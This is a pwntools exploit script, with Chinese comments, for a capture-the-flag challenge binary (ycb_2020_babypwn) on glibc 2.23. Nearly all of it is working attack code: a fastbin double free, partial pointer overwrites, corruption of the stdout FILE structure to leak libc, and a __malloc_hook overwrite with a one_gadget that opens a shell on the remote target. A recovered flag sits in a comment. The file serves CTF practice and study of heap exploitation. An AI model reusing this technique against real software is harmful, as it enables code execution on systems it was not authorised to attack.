#!/usr/bin/python3
from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

host = 'node4.buuoj.cn'
port = 25721

elfpath = './ycb_2020_babypwn_patched'
ldpath = './ld-2.23.so'
libcpath = './libc-2.23.so'
e = ELF(elfpath)
context.binary = e
libc = ELF(libcpath)

context.binary = e

if args.LOCAL:
    p = process([e.path])
    # gdb.attach(p)
else:
    p = remote(host, port)

# io


def s(c): return p.send(c)
def sl(c): return p.sendline(c)
def r(n): return p.recv(n)
def rn(n): return p.recvn(n)
def ru(pattern, drop=False): return p.recvuntil(pattern, drop=drop)
def rl(): return p.recvline()
def ru7f(): return p.recvuntil(b'\x7f')
def su(x): return p.success(x)
def shell(): return p.interactive()

# utilities


def leak(func, address): return p.success(
    "{} ==> {}".format(func, hex(address)))


def command(c):
    ru(b'Your choice : ')
    sl(str(c).encode())


def add(size, name, content):
    command(1)
    ru(b'size of the game\'s name: \n')
    sl(str(size).encode())
    ru(b'game\'s name:\n')
    s(name)
    ru(b'game\'s message:\n')
    sl(content)


# def edit(index, size, content):


def free(index):
    command(2)
    ru(b'game\'s index:\n')
    sl(str(index).encode())


# start pwning
'''
glibc2.23 没有edit函数，没有show
对申请的chunk大小做了限制，只能<=0x70
还是可以double free
但是怎么泄露呢？

估计是要覆盖低字节盲打一波？
参考：https://roderickchan.github.io/2021/04/04/ycb-2020-babypwn/ 写得真好呀

一个trick：
堆的起始地址最低12bit肯定是0，所以实际上每个chunk的地址的最低1字节我们是可以知道的。
'''

msg = p64(0x71)*2

# 0x71 用于伪造chunk，通过_int_free的判断
add(0x60, p64(0x71) * 12, msg)  # id 0
add(0x60, p64(0x71) * 12, msg)  # id 1
# double free
free(0)
free(1)
free(0)

# change fd to chunk 0
add(0x60, b'\x20', msg)  # id 2
# skip 2 chunks
add(0x60, b'a', msg)  # id 3
add(0x60, b'a', msg)  # id 4
# malloc to chunk 0
add(0x60, p64(0) + p64(0x71), msg)  # id 5

free(0)
free(5)

# 将chunk 0的size改为0x91
add(0x60, p64(0) + p64(0x91), msg)  # id 6
# prepare 0x30 chunk for controller chunk
add(0x20, b'aaaa', msg)  # id 7

# 将chunk 0送入unsorted bin
free(0)

# chunk 5 重新进入fast bin，此时bins长这样：
'''
pwndbg> bins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x5563156c6020 —▸ 0x5563156c6030 —▸ 0x7efe7579ab78 (main_arena+88) ◂— 0x5563156c6030
0x80: 0x0
unsortedbin
all: 0x5563156c6030 —▸ 0x7efe7579ab78 (main_arena+88) ◂— 0x5563156c6030
smallbins
empty
largebins
empty
'''
free(5)

if args.LOCAL:
    gdb.attach(p)
free(7)

# 修改fd
add(0x60, p64(0) + p64(0x71) + b'\xdd\xb5', msg)
free(7)
add(0x60, b'deadbeef', msg)
free(7)

# 修改stdout FILE结构体
payload = b'\x00' * (0x7efe7579b620 - 0x7efe7579b5dd - 0x10)
payload += p64(0xfbad1887) + p64(0) * 3
payload += b'\x58'
command(1)
ru(b'size of the game\'s name: \n')
sl(str(0x60).encode())
ru(b'game\'s name:\n')
s(payload)
leak_libc_addr = u64(rn(8))
libc_base = leak_libc_addr - 0x3c56a3
leak("addr", leak_libc_addr)
leak("libcbase", libc_base)
ru(b'game\'s message:\n')
sl(b'aaaa')

# fastbin double free 再来一遍

free(5)
free(0)
free(5)

realloc = libc_base + libc.sym['__libc_realloc']
malloc_hook = libc_base + libc.sym['__malloc_hook']
target = malloc_hook - 0x23

# 为什么这里要free(7)呢？
# 是为了add()时的malloc(0x28)不会从unsorted bin切割。
free(7)
add(0x60, p64(target), msg)
free(7)
add(0x60, p64(target), msg)
free(7)
add(0x60, p64(target), msg)
free(7)

one_gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
payload2 = b'a'*(0x13-8)
payload2 += p64(one_gadgets[1] + libc_base)
payload2 += p64(realloc+0xd)
add(0x60, payload2, msg)

# 执行one_gadget
command(1)
# ru(b'size of the game\'s name: \n')
# sl(str(0x60).encode())

# flag{bb5d7adc-5ddc-47e5-b293-79ba9b8cc493}
# 我的评价：好难
shell()
